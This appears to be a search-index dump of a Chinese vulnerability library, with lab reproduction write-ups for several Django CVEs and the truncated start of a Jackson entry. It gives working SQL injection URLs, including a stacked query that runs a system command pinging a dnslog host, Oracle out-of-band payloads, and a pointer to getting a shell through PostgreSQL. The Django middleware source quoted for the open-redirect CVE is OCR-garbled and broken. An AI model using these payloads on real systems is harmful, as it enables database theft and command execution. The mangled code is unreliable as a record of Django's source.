<p>Django\u901a\u5e38\u642d\u914dpostgresql\u6570\u636e\u5e93\uff0c\u800cJSONField\u662f\u8be5\u6570\u636e\u5e93\u7684\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002\u8be5\u6f0f\u6d1e\u7684\u51fa\u73b0\u7684\u539f\u56e0\u5728\u4e8eDjango\u4e2dJSONField\u7c7b\u7684\u5b9e\u73b0\uff0cDjango\u7684model\u6700\u672c\u8d28\u7684\u4f5c\u7528\u662f\u751f\u6210SQL\u8bed\u53e5\uff0c\u800c\u5728Django\u901a\u8fc7JSONField\u751f\u6210sql\u8bed\u53e5\u65f6\uff0c\u662f\u901a\u8fc7\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u62fc\u63a5\u3002</p> <p>\u901a\u8fc7JSONField\u7c7b\u83b7\u5f97KeyTransform\u7c7b\u5e76\u751f\u6210sql\u8bed\u53e5\u7684\u4f4d\u7f6e\u3002</p> <p>\u5176\u4e2dkey_name\u662f\u53ef\u63a7\u7684\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u751f\u6210\u7684\u8bed\u53e5\u662f</p> <pre><code>WHERE (field-&gt;'[key_name]') ='value'\n1\n</code></pre> <p>\uff0c\u56e0\u6b64\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x03","title":"0x03\u5f71\u54cd\u7248\u672c","text":"<p>Django \u4e3b\u5f00\u53d1\u5206\u652f</p> <p>Django 2.2.x &lt; 2.2.4</p> <p>Django 2.1.x &lt; 2.1.11</p> <p>Django 1.11.x &lt; 1.11.23</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x04","title":"0x04\u73af\u5883\u642d\u5efa","text":"<p>\u4f7f\u7528vulhub\u7684docker\u73af\u5883\u642d\u5efa</p> <p>vulhub\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/vulhub/vulhub</p> <p>cd vulhub/django/CVE-2019-14234/  docker-compose up -d </p> <p>\u5728\u6d4f\u89c8\u5668\u8bbf\u95eehttp://ip:8000\u51fa\u73b0\u4e00\u4e0b\u9875\u9762\u8bf4\u660e\u642d\u5efa\u6210\u529f  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x05","title":"0x05\u6f0f\u6d1e\u5229\u7528","text":"<p>\u901a\u8fc7\u5bf9\u4ee3\u7801\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u77e5\u9053\u5982\u679c\u5728\u4f60\u7684Django\u4e2d\u4f7f\u7528\u4e86JSONField\u5e76\u4e14\u67e5\u8be2\u7684\u201c\u952e\u540d\u201d\u53ef\u63a7\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165</p> <p>\u8bbf\u95eehttp://ip:8000/admin</p> <p>\u8f93\u5165\u7528\u6237\u540dadmin \uff0c\u5bc6\u7801a123123123 </p> <p>\u7136\u540e\u6784\u9020URL\u8fdb\u884c\u67e5\u8be2\uff0cpayload\uff1a</p> <p>http://ip:8000/admin/vuln/collection/?detail__a\u2019b=123</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e0a\u56fe\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u7ee7\u7eed\u6784\u9020payload</p> <pre><code>http://ip:8000/admin/vuln/collection/?detail__title%27)%3d%271%27 or 1%3d1%2d%2d%20\n1\n</code></pre> <p>\u7531\u4e8eor 1=1\u6c38\u4e3a\u771f\uff0c\u56e0\u6b64\u5e94\u8be5\u8fd4\u56de\u6240\u6709\u7ed3\u679c </p> <p>\u6211\u4eec\u7ed3\u5408CVE-2019-9193\u6211\u4eec\u5c1d\u8bd5\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u6784\u9020url\u5982\u4e0b</p> <pre><code>http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20\n1\n</code></pre> <p>\u9875\u9762\u7ed3\u679c\u867d\u7136\u62a5\u9519\uff0c\u4f46\u662f\u62a5\u9519\u539f\u56e0\u662fno results to fetch\uff0c\u8bf4\u660e\u6211\u4eec\u7684\u8bed\u53e5\u5df2\u7ecf\u6267\u884c</p> <p></p> <p>\u4f7f\u7528dnslog\u68c0\u6d4b\u662f\u5426\u53ef\u4ee5\u6267\u884c\u547d\u4ee4</p> <p>Dnslog\u7f51\u5740\uff1ahttp://dnslog.cn/</p> <p>Payload:</p> <pre><code>http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'ping k1anij.dnslog.cn\n'--%20\n12\n</code></pre> <p></p> <p>\u6210\u529f\u68c0\u6d4b\u5230\u6d41\u91cf </p> <p>\u590d\u73b0\u73af\u5883\u91cc\u7684postgresql\u6570\u636e\u5e93docker\u6ca1\u5bf9\u5916\u7684\u7aef\u53e3\u6620\u5c04\uff0c\u5982\u679c\u5f00\u4e86\u6216\u8005\u771f\u5b9e\u73af\u5883\u91cc\uff0c\u8fd8\u53ef\u4ee5\u7ed3\u5408msf\u901a\u8fc7CVE-2019-9193\u6765getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x06","title":"0x06\u4fee\u590d\u65b9\u5f0f","text":"<p>\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"Django GIS SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#django-gis-sql","title":"Django GIS SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>Django\u662fDjango\u57fa\u91d1\u4f1a\u7684\u4e00\u5957\u57fa\u4e8ePython\u8bed\u8a00\u7684\u5f00\u6e90Web\u5e94\u7528\u6846\u67b6\u3002\u8be5\u6846\u67b6\u5305\u62ec\u9762\u5411\u5bf9\u8c61\u7684\u6620\u5c04\u5668\u3001\u89c6\u56fe\u7cfb\u7edf\u3001\u6a21\u677f\u7cfb\u7edf\u7b49\u3002  Django  1.11.29\u4e4b\u524d\u76841.11.x\u7248\u672c\u30012.2.11\u4e4b\u524d\u76842.2.x\u7248\u672c\u548c3.0.4\u4e4b\u524d\u76843.0.x\u7248\u672c\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684SQL\u8bed\u53e5\u5229\u7528\u8be5\u6f0f\u6d1e\u67e5\u770b\u3001\u6dfb\u52a0\u3001\u4fee\u6539\u6216\u5220\u9664\u6570\u636e\u5e93\u4e2d\u7684\u4fe1\u606f\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_2","title":"\u6f0f\u6d1e\u73af\u5883","text":"<p>\u73af\u5883\u642d\u5efa\uff0c\u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8000\u5373\u53ef\u770b\u5230Django\u9ed8\u8ba4\u9996\u9875\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>payload1\uff1a  \u8bbf\u95eehttp://your-ip:8000/vuln/\uff0c\u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020SQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1</code></p> <p>payload2\uff1a  \u8bbf\u95eehttp://your-ip:8000/vuln2/\u3002 \u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020\u51faSQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32<code>0.05))) FROM \"VULN_COLLECTION2\" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --</code></p> <pre><code>http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1\n1\nhttp://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--\n1\n</code></pre> <p>\u53ef\u89c1\uff0c\u62ec\u53f7\u5df2\u6ce8\u5165\u6210\u529f\uff0cSQL\u8bed\u53e5\u67e5\u8be2\u62a5\u9519\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/","title":"Django SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE 2020 7471\uff09\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#django-sqlcve-2020-7471","title":"Django SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_1","title":"\u7b80\u4ecb","text":"<p>Django  \u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u901a\u544a\u516c\u5e03\u4e86\u4e00\u4e2a\u901a\u8fc7StringAgg\uff08\u5206\u9694\u7b26\uff09\u5b9e\u73b0\u5229\u7528\u7684\u6f5c\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u5206\u9694\u7b26\u4f20\u9012\u7ed9\u805a\u5408\u51fd\u6570contrib.postgres.aggregates.StringAgg\uff0c\u4ece\u800c\u7ed5\u8fc7\u8f6c\u4e49\u5e76\u6ce8\u5165\u6076\u610fSQL\u8bed\u53e5\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<pre><code>Django 1.11.x &lt; 1.11.28\nDjango 2.2.x &lt; 2.2.10\nDjango 3.0.x &lt; 3.0.3\nDjango \u4e3b\u5f00\u53d1\u5206\u652f\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_3","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u5b89\u88c5Django\uff08v3.0.2\uff09</p> <p>pip3 install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple</p> <p></p> <p>\u5b89\u88c5postgres</p> <p>apt-get install postgresql-11</p> <p></p> <p>\u5f00\u542f\u670d\u52a1\u5e76\u767b\u5f55\u8d26\u53f7postgres</p> <p>\u5bc6\u7801\u4e3a\u7a7a</p> <p></p> <p>\u7ed9\u6570\u636e\u5e93\u8d85\u7ea7\u7528\u6237postgres\u6dfb\u52a0\u5bc6\u7801123456</p> <p>\u7136\u540e\u521b\u5efa\u6570\u636e\u5e93</p> <p></p> <p></p> <p>Poc\u5730\u5740\uff1a https://github.com/Saferman/CVE-2020-7471.git</p> <p></p> <p>\u4fee\u6539 sqlvul_projects/settings.py</p> <p>\u4fee\u6539\u76f8\u5173\u914d\u7f6e\u4fe1\u606f\uff0c\u6211\u8fd9\u91cc\u4fee\u6539\u4e86\u5bc6\u7801\u5176\u4ed6\u4e00\u6837\u5373\u53ef</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528manage.py\u8fdb\u884c\u521d\u59cb\u5316\u548c\u914d\u7f6e\u4e86</p> <p>\u521d\u59cb\u5316\u6570\u636e\u8868(django)</p> <p>python3 manage.py migrate</p> <p></p> <p>python3 manage.py makemigrations vul_app</p> <p>python3 manage.py migrate vul_app</p> <p></p> <p>\u4f9d\u6b21\u6267\u884c\u547d\u4ee4\u67e5\u770bvul_app_info\u91cc\u662f\u5426\u6709\u5185\u5bb9</p> <pre><code>sudo -i -u postgres\n\npsql\n\n\\c test\n\n\\d\n\nselect * from vul_app_info;\n</code></pre> <p></p> <p>\u6ca1\u6709</p> <p></p> <p>\u6f0f\u6d1e\u590d\u73b0</p> <p>\u8fd0\u884c POC \u811a\u672c\uff08CVE-2020-7471.py\uff09\u67e5\u770b\u7ed3\u679c</p> <p></p> <p>\u56de\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u53d1\u73b0\u5b58\u5728\u5185\u5bb9\u4e86\uff0c\u6210\u529f</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_4","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/","title":"Django\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e\uff08CVE 2018 14574)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#djangourl","title":"Django\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e","text":"<p>\u5728Django\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u7528\u6237\u8bbf\u95ee\u7684URL\u7684\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u662f\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u52a0\u659c\u6760\uff0c\u90a3\u4e48\u4f1a\u9ed8\u8ba4\u81ea\u52a8\u5e2e\u4f60\u8865\u4e0a\u5b83\u5e76\u8df3\u8f6c\u5230\u5e26\u659c\u6760\u7684\u8bf7\u6c42\u4e2d\u3002\u5728path\u5f00\u5934\u4e3a//example.com\u7684\u60c5\u51b5\u4e0b\uff0cDjango\u6ca1\u505a\u5904\u7406\uff0c\u5bfc\u81f4\u6d4f\u89c8\u5668\u8ba4\u4e3a\u76ee\u7684\u5730\u5740\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u6700\u7ec8\u9020\u6210\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u662f\u76ee\u6807URLCONF\u4e2d\u5b58\u5728\u80fd\u5339\u914d\u4e0a//example.com\u7684\u89c4\u5219\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a<code>version &lt; 2.0.8</code></p> <p>\u6f0f\u6d1e\u539f\u56e0\uff1aDjango\u5b89\u88c5\u597d\u540e\uff0c\u5f53settings\u6a21\u5757\u914d\u7f6e\u597d\u4e86django.middleware.common.CommonMiddleware\uff0c\u4e14APPEND_SLASH\u4e3aTrue\u65f6\u6f0f\u6d1e\u5c31\u4f1a\u89e6\u53d1\uff08\u8fd9\u4e24\u4e2a\u914d\u7f6e\u662f\u9ed8\u8ba4\u5b58\u5728\u7684\uff09\u3002</p> <p>CommonMiddleware\u5176\u5b9e\u662fDjango\u4e2d\u7684\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u56e0\u4e3aDjango\u662f\u7528python\u5199\u7684\uff0c\u6240\u4ee5\u53c8\u53ef\u4ee5\u8bf4\u5b83\u662f\u4e00\u4e2a\u4f4d\u4e8esite-packages/django/middleware/common.py\u7684\u4e00\u4e2a\u7c7b\u3002Django\u5728\u63a5\u53d7\u5230\u4e00\u4e2a\u8bf7\u6c42\uff08request\uff09\u540e\uff0c\u4f1a\u5148\u653e\u5230\u4e2d\u95f4\u4ef6\uff08CommonMiddleware\uff09\u4e2d\u53bb\u5904\u7406\uff0c\u7136\u540e\u518d\u901a\u8fc7\u9ed8\u8ba4\u7684 URL  \u65b9\u5f0f\u8fdb\u884c\u3002\u5982\u679c\u8bbe\u7f6e\u4e86APPEND_SLASH=True\uff0c\u5e76\u4e14\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u6709\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5728urlpatterns\u4e2d\u4e5f\u5339\u914d\u4e0d\u5230\u8fd9\u4e2aURL\uff0c\u5219\u901a\u8fc7\u5728\u672b\u5c3e\u9644\u52a0\u659c\u6760\u6765\u5f62\u6210\u65b0\u7684URL\u3002\u5982\u679c\u5728urlpatterns\u4e2d\u627e\u5230\u6b64\u65b0URL\uff0c\u5219\u5c06HTTP\u91cd\u5b9a\u5411\u8fd4\u56de\u5230\u6b64\u65b0URL\u3002\u4f8b\u5982\uff1a</p> <pre><code>\u521d\u59cb\u94fe\u63a5\uff1ahttp://your-ip:8000/test\n301\u91cd\u5b9a\u5411\u540e\u7684\u94fe\u63a5\uff1ahttp://your-ip:8000/test/\n12\n</code></pre> <p>\u4f46\u662f\u5982\u679cURL\u662f\u8fd9\u6837\u7684\uff1ahttp://your-ip:8000//example.com\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u8fdb\u5165site-packages/django/middleware/common.py\u4e0b\u6267\u884cprocess_request()\u51fd\u6570\uff1a</p> <pre><code>def process_ request(self, request): \n\"\"\"\nCheck for denied User-Agents and rewrite the URL based on\nsettings. APPEND_ SLASH and settings. PREPEND_ WWW\n\"\"\"\n# Check for denied User-Agents\nif 'HTTP_ USER_ AGENT' in request.META:\nfor user_ agent_ regex in settings .DISALLOWED _USER_ AGENTS:\nif user_ agent_ regex . search(request .META['HTTP_ USER_ AGENT']):\nraise Permi ssionDenied( ' Forbidden user agent ' )\n# Check for a redirect based on settings.PREPEND WWW\nhost = request.get host()\nmust_ prepend = settings.PREPEND _WWW and host and not host . startswith( ' www.' )\nredirect_ url = ( '%s:/ /WWw.%s' % ( request. scheme, host)) if must_ prepend else''\n# Check if a slash should be appended\nif self.should_ redirect_with_slash(request):\npath = self.get_fu11_path_with_slash(request)\nelse :\npath = request.get _fu11_ _path()\n# Return a redirect if necessary\nif redirect_ _url or path != request.get_ full_ path():\nredirect_ url += path\nreturn self .response_ redirect_ class(redirect_ url)\n1234567891011121314151617181920212223\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u9762\u7684\u7a0b\u5e8f\u4f1a\u8fdb\u5165get_full_path_with_slash()\u51fd\u6570\uff1a</p> <pre><code># Check if a slash should be appended\nif self.should_ redirect_with_slash(request):\npath = self.get_fu11_path_with_slash(request)\n123\n</code></pre> <p>\u5206\u6790\u4e00\u4e0bget_full_path_with_slash()\u51fd\u6570\uff1a</p> <pre><code>def get_full_path_with_slash(self, request):\nReturn the full path of the request with a trailing sLash appended.\nRaise a RuntimeError if settings.DEBUG is True and request. method is\nPOST, PUT, or PATCH.\nnew path = request.get_full_path(force_append_slash=True )\nif settings . DEBUG and request . method in ( 'POST', 'PUT', 'PATCH' ):\nraise RuntimeError \n\"You called this URL via %( method)s, but the URL doesn't end\n\"in a slash and you have APPEND_ SLASH set. Django can't'\n\"redirect to the slash URL while maintaining %( method)s data .\n\"Change your form to point to %(url)s (note the trailing \u201d\n\"slash),\nor set APPEND_SLASH=False in your Django settings.\" % {\nmethod ' : request . method\uff0c\nurl': request.get_host() + new_ path,\n}\nreturn new_ path\n1234567891011121314151617\n</code></pre> <p>\u5176\u5b9e\u4f5c\u7528\u5c31\u662f\u7ed9path\u672b\u5c3e\u52a0\u4e0a\u659c\u6760\uff0c\u4e5f\u5c31\u662f\u8fd4\u56de\u4e00\u4e2a//example.com/</p> <p>\u63a5\u7740\u8fdb\u5165response_redirect_class\u51fd\u6570,\u5b83\u662fHTTP\u8df3\u8f6c\u7684\u4e00\u4e2a\u57fa\u7c7b\uff1a</p> <pre><code># Return a redirect if necessary\nif redirect_ url or path != request. get_ ful1_ path():\nredirect_ _url += path\nreturn self. response redirect_ class (redirect_ ur 1)\n1234\n</code></pre> <p>\u4ee5//\u5f00\u5934\u7684\u5916\u90e8URL\u5c06\u7531\u6d4f\u89c8\u5668\u7ffb\u8bd1\u4e3a\u534f\u8bae\u3001\u7edd\u5bf9URL</p> <p>\u518d\u5f80\u540e\u6709\u5bf9\u534f\u8bae\u7684\u68c0\u67e5\uff0c\u4f46\u662fscheme\u6839\u672c\u5c31\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4f1a\u8df3\u8fc7\u8fd9\u4e2a\u5224\u65ad\uff1a</p> <pre><code>class HttpResponseRedirectBase (HttpResponse):\nallowed_ schemes = [ 'http', 'https', 'ftp']\ndef init__ (self, redirect to, *args, **kwargs):\nsuper( )._ init_ ( *args, **kwargs )\nself['Location'] = iri_ to_ uri(redirect_ tq)\nparsed = urlparse(str(redirect_ to))\nif parsed. scheme and parsed. scheme not in self . allowed_ schemes:\nraise DisallowedRedirect(\"Unsafe redirect to URL with protocol '%s'\" % parsed. scheme )\nurl = property(lambda self: self[ 'Location'])\ndef_ repr_ (self):\nreturn '&lt;%(c1s)s status_ code=%( status_ code )d%( content_ type)s, ur1=\"%(ur1)s\"&gt;' % {\ncls': self._ class__ ._ name___ ,\nstatus_ code' : self. status_ code ,\ncontent_ type': self.. content_ type_ for repr,\nurl' : self .ur1,\n}\n12345678910111213141516\n</code></pre> <p>\u63a5\u7740\u53ef\u4ee5\u770b\u5230\u6b63\u5e38\u7684301\u8df3\u8f6c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#_2","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8fdb\u5165\u73af\u5883</p> <p></p> <p>301\u91cd\u5b9a\u5411\u540e\u5c3e\u5df4\u52a0\u4e86\u659c\u6760   \u6dfb\u52a0//www.baidu.com\u540e\u5b9e\u73b0\u4e86\u9875\u9762\u7684\u8df3\u8f6c</p> <p>\u6210\u529f\u8df3\u8f6c </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/","title":"Jackson\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-24616","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>FasterXML Jackson\u53d1\u5e03\u4e86\u65b0\u7684\u9ad8\u5371\u6f0f\u6d1e\uff08\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-24616\uff09\uff0c\u5176\u5b98\u65b9\u56e2\u961f\u53d1\u5e03\u4e86 jackson-databind \u7684\u65b0\u7248\u672c 2.9.10.6\uff0c\u5176\u4e2d\u4fee\u590d\u4e86\u51e0\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 FasterXML Jackson\u662f\u7f8e\u56fdFasterXML\u516c\u53f8\u7684\u4e00\u6b3e\u9002\u7528\u4e8eJava\u7684\u6570\u636e\u5904\u7406\u5de5\u5177\u3002jackson-databind\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u5177\u6709\u6570\u636e\u7ed1\u5b9a\u529f\u80fd\u7684\u7ec4\u4ef6\u3002 FasterXML jackson-databind 